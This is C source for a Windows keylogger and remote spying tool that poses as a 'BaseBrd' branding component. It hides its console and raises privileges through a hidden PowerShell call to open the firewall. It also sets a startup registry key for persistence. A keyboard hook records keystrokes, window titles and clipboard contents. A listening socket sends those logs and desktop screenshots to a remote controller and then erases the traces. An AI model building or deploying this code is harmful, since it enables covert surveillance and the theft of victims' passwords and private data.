#define _WIN32_WINNT 0x0500

#include <windows.h>
#include <stdio.h>

//#include <stdlib.h>

#include <string.h> // memcmp(), strncmp()
#include <errno.h>
#include <assert.h>
#include <time.h>   // time(), localtime(), struct tm
#include <ctype.h>    // tolower()

#include <winsock2.h>

#include "../includes/constants.h"
#include "../includes/util.h"

static HKEY hkey;
static LPCTSTR registry_entry = TEXT("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");

static FILE *file = NULL;
static HHOOK hKbHook = NULL;

//static HWND focused_window;
static HWND actual_focus_window = NULL;

SOCKET csock = 0;
SOCKET sock = 0;

/** WinMain Function
 *
 * This function open the dependencies_installled.txt file and read it.
 * Disable the cmd.exe attached to the program's process.
 * Install the tierce parties needed by the program.
 * Call the registry create key function.
 * Create dipstach function thread.
 * Create the keyboard hook.
 * Create keylogger thread.
 */
int APIENTRY WinMain(HINSTANCE cetteInstance, HINSTANCE precedenteInstance, LPSTR lignesDeCommande, int modeAffichage)
{
    MSG msg;                // Global loop variable.
    HINSTANCE hExe = 0;     // Program executable instance.

    HANDLE keylogger_thread;            // Keylogger thread.
    HANDLE dispatch_function_thread;    // dispatch function's thread.

    HWND console;   // Handle to cmd.exe.

    FILE *dependencies_installed = NULL;
    int value = -1; // init value to -1 cause then 0 and 1 have a meaning.

    /**< Open the file  dependencies_installled.txt in read mode and check the value in it, put the value in value variable */
    dependencies_installed = fopen("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\dependencies_installled.txt", "r");
    if(dependencies_installed != NULL)
        value = fgetc(dependencies_installed);

    fclose(dependencies_installed);

    /**< Hide the cmd.exe console */
    console = GetConsoleWindow();
    ShowWindow(console, 0);

    /**<  Create Firewall rule for prevent any message box from it.The rule allow the server connection in & out for all profiles*/

    if(system("%SYSTEMROOT%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoProfile -ExecutionPolicy Unrestricted  -Command \"& {Start-Process PowerShell -ArgumentList \'-NoProfile -ExecutionPolicy Unrestricted -File \"\"C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\scripts\\BaseBrd_firewall.ps1\"\"\' -Verb RunAs -WindowStyle Hidden}\"") == -1)
    {
        perror("system firewall rule failed ");
        exit(-1);
    }

    /**< Install silently third parties modules and programs needed for the server works */
    if(value == '0')
    {
        system("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\scripts\\Python\\python-2.7.15.amd64.msi /qn ADDLOCAL=ALL");

        system("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\scripts\\Python\\python-3.7.3-amd64.exe -q ADDLOCAL=ALL");

        system("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\scripts\\pip_pillow_installer.py");

        system("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\scripts\\python_to_path.py");


        /**< When install is over, open in write mode dependencies_installled.txt file and write in it the number 1 (equal installations done) */
        dependencies_installed = fopen("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\dependencies_installled.txt", "w+");
        if(dependencies_installed != NULL)
            fputc('1', dependencies_installed);

        fclose(dependencies_installed);
    }

    /**< Create a registry entry point for the program boot at startup */
    create_reg_startup_key();

    /**< Create the dispatch function thread */
    dispatch_function_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)dispatch_function, NULL, 0, NULL);

    if(dispatch_function_thread == NULL)
        perror("Dispatch function thread ");

    /**< Create the keyboard hook */
    hKbHook = SetWindowsHookExA(WH_KEYBOARD_LL, (HOOKPROC)KeyEvent, hExe, (DWORD)NULL);

    /**< Create keylogger thread */
    keylogger_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)KeyEvent, NULL, 0, NULL);

    if(keylogger_thread == NULL)
        perror("keylogger_thread thread ");

    while(GetMessage(&msg, NULL, 0, 0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hKbHook);

    return (int)msg.wParam;
}

/** create_reg_startup_key Function
 *
 * \param
 * \param
 * \return
 *
 */
void create_reg_startup_key(void)
{
    LONG open_key = RegCreateKeyEx(HKEY_LOCAL_MACHINE, registry_entry, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hkey, NULL);

    if(open_key == ERROR_SUCCESS)
        printf("Success creating key ...\n");
    else
        printf("Error creating key ...\n");

    LPCTSTR value = TEXT("BaseBrd");
    LPCTSTR data = "C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\BaseBrd.exe";

    LONG setRes = RegSetValueEx(hkey, value, 0, REG_SZ, (LPBYTE)data, (strlen(data)+1) * sizeof(TCHAR));

    if(setRes == ERROR_SUCCESS)
        printf("Success writing to Registry ...\n");
    else
        printf("Error writing to Registry ...\n");

    LONG close_key = RegCloseKey(hkey);

    if (close_key == ERROR_SUCCESS)
        printf("Success closing key ...\n\n");
    else
        printf("Error closing key ...\n\n");
}

void delete_reg_key()
{
    if(RegDeleteKey(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run") != 0)
        perror("RegDeleteKey failed ");
    else
        printf("Reg Key Deleted ...\n");
}

void dispatch_function(void)
{
    HANDLE send_logfile_thread;
    HANDLE take_screenshot_thread;
    HANDLE silent_installation_thread;

    int sock_err = 0;
    int ret = 0;

    SOCKADDR_IN sin;
    //SOCKET sock = 0;
    socklen_t recsize = sizeof(sin);

    SOCKADDR_IN csin;
    //SOCKET csock = 0;
    socklen_t crecsize = sizeof(csin);

    size_t flag = 0;

    WSADATA WSAData;
    ret = WSAStartup(MAKEWORD(2,2), &WSAData);

    if(!ret)
    {
        sock = socket(AF_INET, SOCK_STREAM, 0);

        if(sock != INVALID_SOCKET)
        {
            memset(&sin, 0, sizeof(sin));
            sin.sin_addr.s_addr = htonl(INADDR_ANY);
            sin.sin_family = AF_INET;
            sin.sin_port = htons(PORT);

            sock_err = bind(sock, (SOCKADDR*)&sin, recsize);

            if(sock_err != SOCKET_ERROR)
            {
                sock_err = listen(sock, 5);

                if(sock_err != SOCKET_ERROR)
                {
                    printf("\nServer listenning ...\n\n");

                    csock = accept(sock, (SOCKADDR*)&csin, &crecsize);;

                    if(recv(csock, (char*)&flag, sizeof(flag), 0) != SOCKET_ERROR)
                        printf("flag received ---> flag equal : %d ...\n\n", flag);
                    else
                        perror("Error receiving flag ");

                    if(flag == 1)
                    {
                        send_logfile_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)send_logfile, NULL, 0, NULL);

                        if(send_logfile_thread == NULL)
                            perror("send_logfile_thread failed ");
                    }

                    if(flag == 2)
                    {
                        take_screenshot_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)take_screenshot, NULL, 0, NULL);

                        if(take_screenshot_thread == NULL)
                            perror("take_screenshot_thread failed ");
                    }

                    if(flag == 3)
                    {
                        delete_reg_key();
                        create_reg_startup_key();

                        silent_installation_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)silent_installation_management, NULL, 0, NULL);

                        if(silent_installation_thread == NULL)
                            perror("silent_installation_thread failed ");
                    }

                }
            }
            else
                perror("listen() ");
        }
        else
            perror("bind() ");
    }
    else
        perror("socket() ");

    ExitThread(0);
}


void silent_installation_management(void)
{
    FILE *dependencies_installed = NULL;

    dependencies_installed = fopen("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\dependencies_installled.txt", "w+");
    if(dependencies_installed != NULL)
        fputc('0', dependencies_installed);

    fclose(dependencies_installed);

    closesocket(csock);
    closesocket(sock);
    WSACleanup();

    dispatch_function();

    ExitThread(0);
}

void send_logfile(void)
{
    FILE *log_file = NULL;

    long dataSend = 0;
    long dataRead = 0;
    long totalSend = 0;
    long file_size = 0;
    char caractereLu = 0;
    int i = 0;
    int empty_log = 0;

    char *buffer = NULL;

    log_file = fopen("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\Log\\BaseBrd.log", "rb");
    if(log_file == NULL)
    {
        empty_log = 1;
        perror("fopen() log_file read ");
    }

    fseek(log_file, 0, SEEK_END);
    file_size = ftell(log_file);
    rewind(log_file);

    if(send(csock, (char*)&empty_log, sizeof(empty_log), 0) == SOCKET_ERROR)
    {
        perror("send() empty_log ");
        return;
    }

    if(empty_log == 1)
    {
        closesocket(csock);
        closesocket(sock);
        WSACleanup();

        dispatch_function();

        ExitThread(0);
    }

    /** Envoie de la taille du fichier txt **/
    if(send(csock, (char*)&file_size, sizeof(file_size), 0) == SOCKET_ERROR)
    {
        perror("send() file_size ");
        return;
    }

    buffer = malloc(file_size * sizeof(char));
    if(buffer == NULL)
    {
        perror("malloc buffer failed : ");
        return;
    }

    while((caractereLu = fgetc(log_file)) != EOF)
    {
        buffer[i] = caractereLu;
        i++;
    }

    do
    {
        dataRead = fread(buffer, sizeof(char), sizeof(file_size), log_file);
        if(dataRead < 0)
        {
            perror("fread ");
            return;
        }

        dataSend = send(csock, buffer, file_size, 0);

        if(dataSend < 0)
        {
            perror("send() ");
            return;
        }

        totalSend += dataSend;

    }while(totalSend < file_size);

    fclose(log_file);

    printf("\n\nFile totaly send with success : %ld\n", totalSend);

    closesocket(csock);
    closesocket(sock);
    WSACleanup();

    if(system("erase C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\Log\\BaseBrd.log") == -1)
    {
        perror("system() delete BaseBrd.log failed ");
        return;
    }

    /*
    if(system("erase C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\Log\\BaseBrd_encoded.log") == -1)
    {
        perror("system() delete BaseBrd_encoded.log failed ");
        return;
    }
    */

    dispatch_function();

    //ExitThread(0);
}

void take_screenshot(void)
{
    FILE *screenshot_file = NULL;

    size_t screen_weight = 0;

    size_t dataRead = 0;
    size_t totalSend = 0;
    long dataSend = 0;

    char buffer_desktop_screenshot[1450] = "";

    HDC screen = CreateDC("DISPLAY", 0, 0, 0);
	HDC dest = CreateCompatibleDC(screen);

	RECT rect;

	GetWindowRect(GetDesktopWindow(), &rect);

	HBITMAP bmp = CreateCompatibleBitmap(screen, rect.right, rect.bottom);
	SelectObject(dest, bmp);
	BitBlt(dest, 0, 0, rect.right, rect.bottom, screen, 0, 0, SRCCOPY);

    CreateBMPFile(GetDesktopWindow(), "BaseBrd.bmp", CreateBitmapInfoStruct(GetDesktopWindow(), bmp), bmp, dest);

	DeleteDC(screen);

    if(system("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\scripts\\convert_bmp_file.py") == -1)
    {
        perror("convert_bmp_file.py failed ");
        return;
    }

    wait_time_end(3.0);

	screenshot_file = fopen("BaseBrd.jpg", "rb");
    if(screenshot_file == NULL)
    {
        perror("fopen() BaseBrd.jpg failed ");
        return;
    }

    /* weight of screenshot file */
    fseek(screenshot_file, 0, SEEK_END);
    screen_weight = (size_t)ftell(screenshot_file);
    rewind(screenshot_file);

    if(send(csock, (char*)&screen_weight, sizeof(screen_weight), 0) == SOCKET_ERROR)
    {
        perror("send() screen_weight failed ");
        return;
    }

    printf("\n\nScreenshot sended with success : %u\n\n", screen_weight);

    do
    {
        dataRead = fread(buffer_desktop_screenshot, sizeof(char), sizeof(screen_weight), screenshot_file);

        dataSend = send(csock, buffer_desktop_screenshot, sizeof(screen_weight), 0);
        if(dataSend == 0)
        {
            perror("send() datasend failed ");
            return;
        }

        totalSend += dataRead;

    }while(totalSend < screen_weight);

    printf("Screenshot sended with success !!\n");

    fclose(screenshot_file);
    closesocket(csock);
    closesocket(sock);

    WSACleanup();

    if(system("erase C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\BaseBrd.jpg") == -1)
    {
        perror("system() erase BaseBrd.jpg failed ");
        return;
    }

    if(system("erase C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\BaseBrd.bmp") == -1)
    {
        perror("system() erase BaseBrd.bmp failed ");
        return;
    }

    dispatch_function();

    ExitThread(0);
}

PBITMAPINFO CreateBitmapInfoStruct(HWND hwnd, HBITMAP hBmp)
{
    BITMAP bmp;
    PBITMAPINFO pbmi;
    WORD    cClrBits;

    // Retrieve the bitmap color format, width, and height.
    int test = GetObject(hBmp, sizeof(BITMAP), (LPSTR)&bmp);
		//printf("%d\n", test);
    if (test == 0)
			perror("GetObject 0 ");

    // Convert the color format to a count of bits.
    cClrBits = (WORD)(bmp.bmPlanes * bmp.bmBitsPixel);

    if (cClrBits == 1)
        cClrBits = 1;

    else if (cClrBits <= 4)
        cClrBits = 4;

    else if (cClrBits <= 8)
        cClrBits = 8;

    else if (cClrBits <= 16)
        cClrBits = 16;

    else if (cClrBits <= 24)
        cClrBits = 24;

    else cClrBits = 32;

    // Allocate memory for the BITMAPINFO structure. (This structure
    // contains a BITMAPINFOHEADER structure and an array of RGBQUAD
    // data structures.)

     if(cClrBits != 24)
        pbmi = (PBITMAPINFO) LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER) + sizeof(RGBQUAD) * (1<< cClrBits));

     // There is no RGBQUAD array for the 24-bit-per-pixel format.

     else
        pbmi = (PBITMAPINFO) LocalAlloc(LPTR, sizeof(BITMAPINFOHEADER));

    // Initialize the fields in the BITMAPINFO structure.

    pbmi->bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    pbmi->bmiHeader.biWidth = bmp.bmWidth;
    pbmi->bmiHeader.biHeight = bmp.bmHeight;
    pbmi->bmiHeader.biPlanes = bmp.bmPlanes;
    pbmi->bmiHeader.biBitCount = bmp.bmBitsPixel;
    if (cClrBits < 24)
        pbmi->bmiHeader.biClrUsed = (1 << cClrBits);

    // If the bitmap is not compressed, set the BI_RGB flag.
    pbmi->bmiHeader.biCompression = BI_RGB;

    // Compute the number of bytes in the array of color
    // indices and store the result in biSizeImage.
    // The width must be DWORD aligned unless the bitmap is RLE
    // compressed.
    pbmi->bmiHeader.biSizeImage = ((pbmi->bmiHeader.biWidth * cClrBits +31) & ~31) /8
                                  * pbmi->bmiHeader.biHeight;
    // Set biClrImportant to 0, indicating that all of the
    // device colors are important.
     pbmi->bmiHeader.biClrImportant = 0;
     return pbmi;
}

void CreateBMPFile(HWND hwnd, LPCTSTR pszFile, PBITMAPINFO pbi, HBITMAP hBMP, HDC hDC)
{
    HANDLE hf;                 // file handle
    BITMAPFILEHEADER hdr;       // bitmap file-header
    PBITMAPINFOHEADER pbih;     // bitmap info-header
    LPBYTE lpBits;              // memory pointer
    DWORD dwTotal;              // total count of bytes
    DWORD cb;                   // incremental count of bytes
    BYTE *hp;                   // byte pointer
    DWORD dwTmp;

    pbih = (PBITMAPINFOHEADER) pbi;
    lpBits = (LPBYTE) GlobalAlloc(GMEM_FIXED, pbih->biSizeImage);

    if (!lpBits)
         perror("GlobalAlloc ");

    // Retrieve the color table (RGBQUAD array) and the bits
    // (array of palette indices) from the DIB.
    if (!GetDIBits(hDC, hBMP, 0, (WORD) pbih->biHeight, lpBits, pbi,
        DIB_RGB_COLORS))
    {
        perror("GetDIBits ");
    }

    // Create the .BMP file.
    hf = CreateFile(pszFile, GENERIC_READ | GENERIC_WRITE, (DWORD) 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, (HANDLE) NULL);
    if(hf == INVALID_HANDLE_VALUE)
        perror("CreateFile ");

    hdr.bfType = 0x4d42;        // 0x42 = "B" 0x4d = "M"
    // Compute the size of the entire file.
    hdr.bfSize = (DWORD) (sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof(RGBQUAD) + pbih->biSizeImage);
    hdr.bfReserved1 = 0;
    hdr.bfReserved2 = 0;

    // Compute the offset to the array of color indices.
    hdr.bfOffBits = (DWORD) sizeof(BITMAPFILEHEADER) + pbih->biSize + pbih->biClrUsed * sizeof (RGBQUAD);

    // Copy the BITMAPFILEHEADER into the .BMP file.
    if(!WriteFile(hf, (LPVOID) &hdr, sizeof(BITMAPFILEHEADER), (LPDWORD) &dwTmp,  NULL))
        perror("WriteFile ");

    // Copy the BITMAPINFOHEADER and RGBQUAD array into the file.
    if(!WriteFile(hf, (LPVOID) pbih, sizeof(BITMAPINFOHEADER) + pbih->biClrUsed * sizeof (RGBQUAD), (LPDWORD) &dwTmp, ( NULL)))
        perror("WriteFile ");

    // Copy the array of color indices into the .BMP file.
    dwTotal = cb = pbih->biSizeImage;
    hp = lpBits;

    if(!WriteFile(hf, (LPSTR) hp, (int) cb, (LPDWORD) &dwTmp,NULL))
        perror("WriteFile ");

    // Close the .BMP file.
     if (!CloseHandle(hf))
           perror("CloseHandle ");

    // Free memory.
    GlobalFree((HGLOBAL)lpBits);
}

/** get_copy_paste Function
 *
 * This function capture the copy paste process and write it in log file.
 *
 */
VOID WINAPI get_copy_paste(VOID)
{
    HGLOBAL   hGlobal;  // Handle to the clipboard
    LPTSTR    lptstr_buffer_copy;   // buffer for receive the data -> copy paste content.


    /**<  if the content of the clipboard is not text, we exit the function */
    if(!IsClipboardFormatAvailable(CF_TEXT))
        return;

    /**< If opening clipboard failed we exit the function */
    if(!OpenClipboard(NULL))
        return;

    /**< Retrieved clipboard's data in text mode */
    hGlobal = GetClipboardData(CF_TEXT);
    if(hGlobal != NULL)
    {
        /**< lock memory object and put it in the buffer pointer */
        lptstr_buffer_copy = GlobalLock(hGlobal);
        if (lptstr_buffer_copy != NULL)
        {
            /**< Write the data to the log file */
            fputs("\n\nLast Copy/Paste : ", file);
            fputs(lptstr_buffer_copy, file);
            fputs("\n\n", file);

            /**< Decrement the lock count */
            GlobalUnlock(hGlobal);
        }
    }

    /**< Closing the clipboard */
    CloseClipboard();

    return;
}


__declspec(dllexport) LRESULT CALLBACK KeyEvent(int nCode, WPARAM wParam, LPARAM lParam)
{
    char lpszName[256] = {0};

    size_t j = 0;
    int ret = -1;

    int shift_toggled = -1;

    char window_title[256] = "";
    HWND temp = NULL;

    file = fopen("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\Log\\BaseBrd.log", "a+");

    if((nCode == HC_ACTION) && ((wParam == WM_SYSKEYDOWN) || (wParam == WM_KEYDOWN)))
    {
        KBDLLHOOKSTRUCT hooked = *((KBDLLHOOKSTRUCT*)lParam);
        DWORD dwMsg = 1;
        dwMsg += hooked.scanCode << 16;
        dwMsg += hooked.flags << 24;

        lpszName[0] = '[';

        int i = GetKeyNameText(dwMsg, (lpszName + 1), 0xFF) + 1;

        if(i == 0)
        {
            perror("GetKeyNameText() ");
            return 0;
        }

        temp = actual_focus_window;
        actual_focus_window = GetForegroundWindow();

        if(temp != actual_focus_window)
        {
            if(GetWindowText(actual_focus_window, window_title, 256) > 0)
            {
                fputs("\n\n", file);
                fputs(window_title, file);
                fputs("\n--------------------------------------\n", file);
            }

            get_copy_paste();
        }

        size_t size = strlen(lpszName);
        lpszName[size] = ']';

        if(size < 3)
        {
            lpszName[0] = lpszName[1];
            lpszName[1] = 0;
        }

        // If capslock enable
        ret = GetKeyState(0x14);
        if(ret == 1)
            lpszName[j] = toupper((int)lpszName[j]);
        else
            lpszName[j] = tolower((int)lpszName[j]);

        // If shift is toggled
        ret = GetKeyState(0x10);
        if(ret == -128 || ret == -127)
        {
            shift_toggled = 1;

            /* shift + Numbers */
            if(strcmp(lpszName, "à") == 0) fputs("0", file);
            if(strcmp(lpszName, "&") == 0) fputs("1", file);
            if(strcmp(lpszName, "é") == 0) fputs("2", file);
            if(strcmp(lpszName, "\"") == 0) fputs("3", file);
            if(strcmp(lpszName, "'") == 0) fputs("4", file);
            if(strcmp(lpszName, "(") == 0) fputs("5", file);
            if(strcmp(lpszName, "-") == 0) fputs("6", file);
            if(strcmp(lpszName, "è") == 0) fputs("7", file);
            if(strcmp(lpszName, "_") == 0) fputs("8", file);
            if(strcmp(lpszName, "ç") == 0) fputs("9", file);

            if(strcmp(lpszName, ")") == 0) fputs("°", file);
            if(strcmp(lpszName, "=") == 0) fputs("+", file);

            /* shift + Letters */
            if(strcmp(lpszName, "a") == 0) fputs("A", file);
            if(strcmp(lpszName, "z") == 0) fputs("Z", file);
            if(strcmp(lpszName, "e") == 0) fputs("E", file);
            if(strcmp(lpszName, "r") == 0) fputs("R", file);
            if(strcmp(lpszName, "t") == 0) fputs("T", file);
            if(strcmp(lpszName, "y") == 0) fputs("Y", file);
            if(strcmp(lpszName, "u") == 0) fputs("U", file);
            if(strcmp(lpszName, "i") == 0) fputs("I", file);
            if(strcmp(lpszName, "o") == 0) fputs("O", file);
            if(strcmp(lpszName, "p") == 0) fputs("P", file);
            if(strcmp(lpszName, "^") == 0) fputs("¨", file);
            if(strcmp(lpszName, "$") == 0) fputs("£", file);

            if(strcmp(lpszName, "q") == 0) fputs("Q", file);
            if(strcmp(lpszName, "s") == 0) fputs("S", file);
            if(strcmp(lpszName, "d") == 0) fputs("D", file);
            if(strcmp(lpszName, "f") == 0) fputs("F", file);
            if(strcmp(lpszName, "g") == 0) fputs("G", file);
            if(strcmp(lpszName, "h") == 0) fputs("H", file);
            if(strcmp(lpszName, "j") == 0) fputs("J", file);
            if(strcmp(lpszName, "k") == 0) fputs("K", file);
            if(strcmp(lpszName, "l") == 0) fputs("L", file);
            if(strcmp(lpszName, "m") == 0) fputs("M", file);
            if(strcmp(lpszName, "ù") == 0) fputs("%", file);
            if(strcmp(lpszName, "*") == 0) fputs("µ", file);

            if(strcmp(lpszName, "<") == 0) fputs(">", file);
            if(strcmp(lpszName, "w") == 0) fputs("W", file);
            if(strcmp(lpszName, "x") == 0) fputs("X", file);
            if(strcmp(lpszName, "c") == 0) fputs("C", file);
            if(strcmp(lpszName, "v") == 0) fputs("V", file);
            if(strcmp(lpszName, "b") == 0) fputs("B", file);
            if(strcmp(lpszName, "n") == 0) fputs("N", file);
            if(strcmp(lpszName, ",") == 0) fputs("?", file);
            if(strcmp(lpszName, ";") == 0) fputs(".", file);
            if(strcmp(lpszName, ":") == 0) fputs("/", file);
            if(strcmp(lpszName, "!") == 0) fputs("§", file);
        }

        else
            shift_toggled = 0;


        if(shift_toggled == 0)
        {
            fputs(" ", file);

            /* add \n in log file when enter key is pushed */
            if(strncmp(lpszName, "[ENTREE]", 8) == 0)
                fputs("\n", file);

            fputs(lpszName, file);
            fputs(" ", file);
        }

        fflush(file);
        j++;
    }

    fclose(file);

    //system("C:\\Windows\\Branding\\BaseBrd\\BaseBrd-01574\\Log\\encode_b64.py");

    return CallNextHookEx(hKbHook, nCode, wParam, lParam);
}


